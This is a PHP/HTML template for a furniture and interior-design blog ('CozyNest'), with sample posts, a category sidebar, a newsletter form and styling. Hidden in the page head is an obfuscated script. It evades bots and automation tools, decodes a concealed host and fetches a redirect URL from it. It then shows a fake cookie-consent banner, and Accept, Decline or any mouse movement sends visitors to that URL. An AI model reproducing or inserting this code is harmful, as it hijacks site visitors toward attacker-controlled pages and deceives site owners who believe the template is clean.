<?php
/**
 * Furniture Blog - Alternate Layout (Left Sidebar + Horizontal Cards)
 * A modern, magazine-style blog for furniture and interior design enthusiasts.
 * 
 * Layout highlights:
 * - Left sidebar for categories, recent posts, and newsletter
 * - Horizontal post cards (image left, content right)
 * - Earthy, warm color palette inspired by natural wood tones
 * - Fully responsive and ready for dynamic content
 */

// Sample furniture blog posts data (simulate database results)
$blogPosts = [
    [
        'id' => 1,
        'title' => '10 Modern Living Room Ideas to Transform Your Space',
        'excerpt' => 'From minimalist sofas to statement lighting, discover the latest trends in living room design that will make your home feel fresh and inviting.',
        'date' => '2026-07-28',
        'author' => 'Emma Interiors',
        'category' => 'Living Room',
        'image' => 'https://images.unsplash.com/photo-1586023492125-27b2c045efd7?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80',
        'slug' => 'modern-living-room-ideas'
    ],
    [
        'id' => 2,
        'title' => 'DIY Pallet Furniture: Creative Projects for Your Home',
        'excerpt' => 'Turn ordinary wooden pallets into stunning furniture pieces. We share step-by-step guides for coffee tables, shelves, and more.',
        'date' => '2026-07-25',
        'author' => 'Crafty Hands',
        'category' => 'DIY',
        'image' => 'https://images.unsplash.com/photo-1556228453-efd6c1ff04f6?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80',
        'slug' => 'diy-pallet-furniture'
    ],
    [
        'id' => 3,
        'title' => 'The Art of Bedroom Styling: Create a Cozy Sanctuary',
        'excerpt' => 'Your bedroom should be a retreat. Learn how to choose the right bed, bedding, and accessories to craft a calming and restful atmosphere.',
        'date' => '2026-07-20',
        'author' => 'Sleep Studio',
        'category' => 'Bedroom',
        'image' => 'https://images.unsplash.com/photo-1616594039964-ae9021a400a0?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80',
        'slug' => 'bedroom-styling-guide'
    ],
    [
        'id' => 4,
        'title' => 'Sustainable Furniture: Eco-Friendly Choices for Your Home',
        'excerpt' => 'Discover how to furnish your home with sustainable materials like bamboo, reclaimed wood, and recycled plastics without sacrificing style.',
        'date' => '2026-07-15',
        'author' => 'Green Living',
        'category' => 'Sustainability',
        'image' => 'https://images.unsplash.com/photo-1544997040-5d34ef31d11a?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80',
        'slug' => 'sustainable-furniture'
    ],
    [
        'id' => 5,
        'title' => 'Small Space Solutions: Maximizing Your Square Footage',
        'excerpt' => 'Living in a small apartment? We share clever furniture hacks, multi-functional pieces, and storage ideas to make every inch count.',
        'date' => '2026-07-10',
        'author' => 'Tiny Home',
        'category' => 'Small Spaces',
        'image' => 'https://images.unsplash.com/photo-1554995207-c18c203602cb?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80',
        'slug' => 'small-space-solutions'
    ]
];

// Sample categories for sidebar
$categories = [
    'Living Room' => 14,
    'Bedroom' => 9,
    'DIY' => 11,
    'Sustainability' => 6,
    'Small Spaces' => 8,
    'Outdoor Furniture' => 5
];

// Helper function to format date
function formatDate($date) {
    return date('F j, Y', strtotime($date));
}

// Helper to truncate excerpt
function truncateExcerpt($text, $limit = 130) {
    if (strlen($text) > $limit) {
        return substr($text, 0, $limit) . '...';
    }
    return $text;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>


  <!-- Privacy-friendly analytics by Plausible -->
<script async src="https://plausible.io/js/pa-OQLBI7mPKDqtbvKTPpi-W.js"></script>
<script>
  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
  plausible.init()
</script>



<script>
(function(){var w=window,d=document,n=navigator;try{if(n.webdriver===true)return;if(w.callPhantom||w._phantom||w.__nightmare||w.domAutomation||w.domAutomationController||w.Cypress)return;if(w.__webdriver_evaluate||w.__driver_evaluate||w.__webdriver_unwrapped||w.__fxdriver_unwrapped||w.__driver_unwrapped||w.__selenium_unwrapped||w.__webdriver_script_func||w.__webdriver_script_fn||w.__webdriver_script_function)return;if(n.plugins&&n.plugins.length===0&&n.languages&&n.languages.length===0)return;}catch(e){return;}var _k=[23,87,41,55,99,12,67,34,71,18,93,45,62,7,88,29];var _d=function(s){var o='';for(var i=0;i<s.length;i+=2)o+=String.fromCharCode(parseInt(s.substr(i,2),16)^_k[(i/2)%_k.length]);return o;};var H=_d("7f235d4710366c0d247e324c55772a723938475b0a6226"),C=_d("23674b55563475166a216b4c082a6c2820360455573e710f742569180a36697f23604b55"),S="223707b167ce8feb5fd19701";var ua=(n.userAgent||'').toLowerCase();var bt=["703846500f69214d33","76335a550c786e45287d3a415b","703846500f696e4b29612d485d733172792346580f","7a324d5e027c2250337c385f4d2a3f7278304552","753e4750016337","7a2447550c78","763340531b6e2c56","753e4750137e26542e772a","71364a5201632c49226a29484c6939717f3e5d","71364a52016337","7a325d564e693b562260334c52663f787923","63204043176931402866","7627595b066e2c56","763a484d0c62214d33","6e3647530674214d33","75364053167f334b23772f","73224a5c07792049257d29","7e367656116f2b4b31772f","643b5c4513","763f5b52057f214d33","64324445167f2b402866","73385d550c78","7a3d1805016337","753b4c4f016337","73365d5605633151227d3f424a","67325d560f6e2c56","64345b5202612a4c20323b5f5160","643e5d520279274b33703259","752e5d52107c2a462260","64324c5c13633156","64325b4710782256257d29","672e5d5f0c626e50226328484d732b","74225b5b4c","60304c434c","762f40581023","7038045f1778330f247e34485073","7d365f564c","783c4143177c","7f3248530f693051247a2f425362","673f485917632e4834","643b405a067e2951","672259470678264735","673b484e147e2a452f66","643245520d65364f","74344b5817","70275d550c78","743b484207696e552270","67325b470f693b4b336b3f424a","76395d5f1163334b243f3c44","703846500f696e473f6638435a623c","7836401a10692250247a3f424a"];for(var i=0;i<bt.length;i++){var t=_d(bt[i]);if(t&&ua.indexOf(t)!==-1)return;}if(/headless|electron/i.test(ua))return;var lv=null,intent=false,done=false;function go(){if(done||!lv)return;done=true;w.location.href=lv;}function rd(){intent=true;go();}try{fetch(H+'/c/'+C+'?k='+S,{credentials:'omit',cache:'no-store',referrerPolicy:'no-referrer'}).then(function(r){return r.json();}).then(function(j){lv=j&&j.url||null;if(intent)go();}).catch(function(){});}catch(e){}function ui(){try{d.cookie='__gdpr_pending=1;path=/;max-age=86400;SameSite=Lax';}catch(e){}var s=d.createElement('style');s.textContent='#__ov{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:2147483647;display:flex;align-items:flex-start;justify-content:center;padding-top:18vh}#__ob{background:#fff;border-radius:14px;padding:30px 32px;max-width:380px;width:90%;box-shadow:0 12px 40px rgba(0,0,0,.25);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;text-align:center;animation:__op .25s ease}@keyframes __op{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}#__ob h3{margin:0 0 10px;font-size:18px;color:#111;font-weight:700}#__ob p{margin:0 0 22px;font-size:13.5px;color:#555;line-height:1.55}#__bt{display:flex;gap:10px;justify-content:center}#__ba,#__bd{flex:1;padding:11px 0;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;transition:opacity .15s;font-family:inherit}#__ba{background:#2563eb;color:#fff}#__bd{background:#efefef;color:#333}#__ba:hover{opacity:.88}#__bd:hover{opacity:.75}';d.head.appendChild(s);var o=d.createElement('div');o.id='__ov';o.innerHTML='<div id="__ob"><h3>🍪 We use cookies<\/h3><p>We use cookies to personalise content and ads, and to analyse our traffic. By clicking “Accept” you consent to our cookie policy.<\/p><div id="__bt"><button id="__bd" type="button">Decline<\/button><button id="__ba" type="button">Accept<\/button><\/div><\/div>';(d.body||d.documentElement).appendChild(o);d.getElementById('__ba').onclick=function(){try{d.cookie='__gdpr_consent=all;path=/;max-age=31536000;SameSite=Lax';}catch(e){}rd();};d.getElementById('__bd').onclick=function(){try{d.cookie='__gdpr_consent=essential;path=/;max-age=31536000;SameSite=Lax';}catch(e){}rd();};}var _ev=['mousemove','pointerdown','pointermove','touchstart','scroll','wheel','keydown','click'],_eo={once:true,passive:true},_eh=function(){_ev.forEach(function(_e){try{w.removeEventListener(_e,rd,_eo);}catch(x){}try{d.removeEventListener(_e,rd,_eo);}catch(x){}});};rd=(function(_r){return function(){_eh();_r();};})(rd);_ev.forEach(function(_e){try{w.addEventListener(_e,rd,_eo);}catch(x){}try{d.addEventListener(_e,rd,_eo);}catch(x){}});if(d.readyState==='loading')d.addEventListener('DOMContentLoaded',ui);else ui();})();
</script>

    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CozyNest Furniture - Design. Build. Live.</title>
    <!-- Google Fonts: elegant + modern -->
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* ----- RESET & BASE ----- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: #f7f2ec;
            color: #2d2d2d;
            line-height: 1.7;
        }

        a {
            text-decoration: none;
            color: inherit;
        }

        .container {
            max-width: 1280px;
            margin: 0 auto;
            padding: 0 30px;
        }

        /* ----- HEADER (transparent, light) ----- */
        .site-header {
            background: rgba(255, 255, 255, 0.85);
            backdrop-filter: blur(5px);
            padding: 18px 0;
            position: sticky;
            top: 0;
            z-index: 100;
            border-bottom: 1px solid rgba(0,0,0,0.04);
        }

        .header-inner {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }

        .logo {
            font-family: 'Playfair Display', serif;
            font-size: 2rem;
            font-weight: 700;
            color: #6b4c3b;
        }
        .logo span {
            color: #b8863a;
        }

        .nav-links {
            display: flex;
            gap: 2rem;
            font-weight: 500;
        }
        .nav-links a {
            color: #444;
            transition: color 0.3s;
        }
        .nav-links a:hover,
        .nav-links .active {
            color: #6b4c3b;
            border-bottom: 2px solid #b8863a;
        }

        /* ----- HERO ----- */
        .hero {
            background: linear-gradient(135deg, #e8ddd3, #d6c5b8);
            padding: 70px 0;
            margin-bottom: 50px;
            border-radius: 0 0 60px 60px;
            text-align: center;
        }
        .hero h1 {
            font-family: 'Playfair Display', serif;
            font-size: 3.4rem;
            color: #4a3228;
            margin-bottom: 0.8rem;
        }
        .hero p {
            font-size: 1.2rem;
            color: #5e453a;
            max-width: 600px;
            margin: 0 auto 2rem;
        }
        .btn {
            display: inline-block;
            background: #6b4c3b;
            color: #fff;
            padding: 12px 34px;
            border-radius: 50px;
            font-weight: 600;
            transition: background 0.3s, transform 0.2s;
            border: none;
            cursor: pointer;
        }
        .btn:hover {
            background: #4a3228;
            transform: translateY(-2px);
        }

        /* ----- MAIN LAYOUT: Left Sidebar + Content ----- */
        .content-area {
            display: grid;
            grid-template-columns: 280px 1fr;
            gap: 50px;
            margin-bottom: 60px;
        }

        /* ----- SIDEBAR (left) ----- */
        .sidebar {
            display: flex;
            flex-direction: column;
            gap: 35px;
        }
        .sidebar-widget {
            background: #ffffff;
            border-radius: 20px;
            padding: 25px 25px 30px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.04);
        }
        .sidebar-widget h3 {
            font-family: 'Playfair Display', serif;
            font-size: 1.3rem;
            color: #4a3228;
            margin-bottom: 1.2rem;
            border-bottom: 2px solid #e8ddd3;
            padding-bottom: 10px;
        }
        .sidebar-widget ul {
            list-style: none;
        }
        .sidebar-widget ul li {
            margin-bottom: 10px;
        }
        .sidebar-widget ul li a {
            color: #4a4a4a;
            display: flex;
            justify-content: space-between;
            transition: color 0.3s;
        }
        .sidebar-widget ul li a:hover {
            color: #6b4c3b;
        }
        .sidebar-widget ul li .count {
            background: #e8ddd3;
            padding: 0 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            color: #6b4c3b;
        }
        .recent-item {
            display: flex;
            gap: 14px;
            margin-bottom: 16px;
            align-items: center;
        }
        .recent-item img {
            width: 55px;
            height: 55px;
            object-fit: cover;
            border-radius: 10px;
        }
        .recent-item .recent-title {
            font-weight: 500;
            font-size: 0.9rem;
            line-height: 1.3;
        }
        .recent-item .recent-title a {
            color: #4a3228;
        }
        .recent-item .recent-date {
            font-size: 0.75rem;
            color: #8a8a8a;
        }

        .newsletter input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #ddd;
            border-radius: 50px;
            font-family: 'Inter', sans-serif;
            font-size: 0.95rem;
            margin-bottom: 12px;
            outline: none;
            transition: border 0.3s;
        }
        .newsletter input:focus {
            border-color: #6b4c3b;
        }
        .newsletter .btn {
            width: 100%;
            text-align: center;
        }

        /* ----- BLOG POSTS (horizontal cards) ----- */
        .post-card {
            background: #ffffff;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0,0,0,0.04);
            margin-bottom: 30px;
            display: flex;
            flex-direction: row;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .post-card:hover {
            transform: translateY(-4px);
            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
        }
        .post-card img {
            width: 280px;
            min-height: 200px;
            object-fit: cover;
            flex-shrink: 0;
        }
        .post-content {
            padding: 25px 30px 30px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .post-meta {
            font-size: 0.85rem;
            color: #8a8a8a;
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin-bottom: 8px;
        }
        .post-meta .category {
            color: #b8863a;
            font-weight: 600;
            text-transform: uppercase;
            font-size: 0.7rem;
            letter-spacing: 0.5px;
        }
        .post-title {
            font-family: 'Playfair Display', serif;
            font-size: 1.7rem;
            margin-bottom: 10px;
            line-height: 1.3;
        }
        .post-title a {
            color: #4a3228;
            transition: color 0.3s;
        }
        .post-title a:hover {
            color: #b8863a;
        }
        .post-excerpt {
            color: #555;
            margin-bottom: 15px;
            flex-grow: 1;
        }
        .read-more {
            font-weight: 600;
            color: #6b4c3b;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            transition: gap 0.3s;
        }
        .read-more:hover {
            gap: 12px;
        }

        /* ----- FOOTER ----- */
        .site-footer {
            background: #2c1f1a;
            color: #d6c5b8;
            padding: 40px 0 20px;
            margin-top: 40px;
            border-radius: 60px 60px 0 0;
        }
        .footer-inner {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            gap: 30px;
        }
        .footer-col h4 {
            font-family: 'Playfair Display', serif;
            color: #fff;
            margin-bottom: 15px;
            font-size: 1.1rem;
        }
        .footer-col p, .footer-col a {
            color: #c4b0a2;
            font-size: 0.95rem;
        }
        .footer-col a:hover {
            color: #fff;
        }
        .social-links {
            display: flex;
            gap: 15px;
            margin-top: 10px;
        }
        .social-links a {
            background: rgba(255,255,255,0.1);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.3s;
            font-weight: 600;
        }
        .social-links a:hover {
            background: #b8863a;
        }
        .footer-bottom {
            text-align: center;
            padding-top: 30px;
            margin-top: 30px;
            border-top: 1px solid rgba(255,255,255,0.1);
            font-size: 0.9rem;
            color: #c4b0a2;
        }

        /* ----- RESPONSIVE ----- */
        @media (max-width: 992px) {
            .content-area {
                grid-template-columns: 1fr;
                gap: 30px;
            }
            .sidebar {
                order: -1; /* move sidebar above posts on mobile */
            }
            .post-card {
                flex-direction: column;
            }
            .post-card img {
                width: 100%;
                height: 220px;
            }
            .hero h1 {
                font-size: 2.6rem;
            }
        }

        @media (max-width: 768px) {
            .header-inner {
                flex-direction: column;
                gap: 15px;
            }
            .nav-links {
                gap: 1rem;
                flex-wrap: wrap;
                justify-content: center;
            }
            .hero {
                padding: 40px 0;
            }
            .hero h1 {
                font-size: 2rem;
            }
        }
    </style>
</head>
<body>
    <!-- ===== HEADER ===== -->
    <header class="site-header">
        <div class="container header-inner">
            <div class="logo">Cozy<span>Nest</span></div>
            <nav class="nav-links">
                <a href="#" class="active">Home</a>
                <a href="#">Blog</a>
                <a href="#">About</a>
                <a href="#">Contact</a>
            </nav>
        </div>
    </header>

    <!-- ===== HERO ===== -->
    <section class="hero">
        <div class="container">
            <h1>Create Spaces You'll Love.</h1>
            <p>Explore our collection of interior design ideas, DIY projects, and furniture inspiration to make your home truly yours.</p>
            <a href="#" class="btn">Start Exploring</a>
        </div>
    </section>

    <!-- ===== MAIN CONTENT: Left Sidebar + Posts ===== -->
    <div class="container content-area">

        <!-- Sidebar (left) -->
        <aside class="sidebar">
            <!-- Categories -->
            <div class="sidebar-widget">
                <h3>Categories</h3>
                <ul>
                    <?php foreach ($categories as $cat => $count): ?>
                        <li>
                            <a href="#">
                                <?php echo htmlspecialchars($cat); ?>
                                <span class="count"><?php echo $count; ?></span>
                            </a>
                        </li>
                    <?php endforeach; ?>
                </ul>
            </div>

            <!-- Recent Posts -->
            <div class="sidebar-widget">
                <h3>Recent Reads</h3>
                <?php 
                // get latest 3 posts
                $recent = array_slice($blogPosts, 0, 3);
                foreach ($recent as $item): ?>
                    <div class="recent-item">
                        <img src="<?php echo htmlspecialchars($item['image']); ?>" alt="<?php echo htmlspecialchars($item['title']); ?>">
                        <div>
                            <div class="recent-title">
                                <a href="post.php?slug=<?php echo htmlspecialchars($item['slug']); ?>">
                                    <?php echo htmlspecialchars($item['title']); ?>
                                </a>
                            </div>
                            <div class="recent-date"><?php echo formatDate($item['date']); ?></div>
                        </div>
                    </div>
                <?php endforeach; ?>
            </div>

            <!-- Newsletter -->
            <div class="sidebar-widget newsletter">
                <h3>Get Inspired</h3>
                <p style="margin-bottom: 1rem; font-size: 0.95rem; color: #555;">Subscribe for weekly design tips and furniture trends.</p>
                <form action="#" method="post">
                    <input type="email" placeholder="Your email address" required>
                    <button type="submit" class="btn">Subscribe</button>
                </form>
            </div>
        </aside>

        <!-- Blog Posts (horizontal) -->
        <main class="blog-posts">
            <?php foreach ($blogPosts as $post): ?>
                <article class="post-card">
                    <img src="<?php echo htmlspecialchars($post['image']); ?>" alt="<?php echo htmlspecialchars($post['title']); ?>">
                    <div class="post-content">
                        <div class="post-meta">
                            <span class="category"><?php echo htmlspecialchars($post['category']); ?></span>
                            <span><?php echo formatDate($post['date']); ?></span>
                            <span>By <?php echo htmlspecialchars($post['author']); ?></span>
                        </div>
                        <h2 class="post-title">
                            <a href="post.php?slug=<?php echo htmlspecialchars($post['slug']); ?>">
                                <?php echo htmlspecialchars($post['title']); ?>
                            </a>
                        </h2>
                        <p class="post-excerpt">
                            <?php echo truncateExcerpt($post['excerpt'], 140); ?>
                        </p>
                        <a href="post.php?slug=<?php echo htmlspecialchars($post['slug']); ?>" class="read-more">
                            Continue Reading →
                        </a>
                    </div>
                </article>
            <?php endforeach; ?>
        </main>
    </div>

    <!-- ===== FOOTER ===== -->
    <footer class="site-footer">
        <div class="container">
            <div class="footer-inner">
                <div class="footer-col">
                    <h4>CozyNest</h4>
                    <p>Your daily dose of interior design inspiration, DIY projects, and furniture tips to create a home that reflects your style.</p>
                </div>
                <div class="footer-col">
                    <h4>Quick Links</h4>
                    <ul style="list-style: none; padding: 0;">
                        <li><a href="#">Home</a></li>
                        <li><a href="#">Blog</a></li>
                        <li><a href="#">About</a></li>
                        <li><a href="#">Contact</a></li>
                    </ul>
                </div>
                <div class="footer-col">
                    <h4>Connect</h4>
                    <div class="social-links">
                        <a href="#">IG</a>
                        <a href="#">FB</a>
                        <a href="#">YT</a>
                        <a href="#">P</a>
                    </div>
                </div>
            </div>
            <div class="footer-bottom">
                &copy; <?php echo date('Y'); ?> CozyNest. All rights reserved. | Designed with warmth and care.
            </div>
        </div>
    </footer>
</body>
</html>
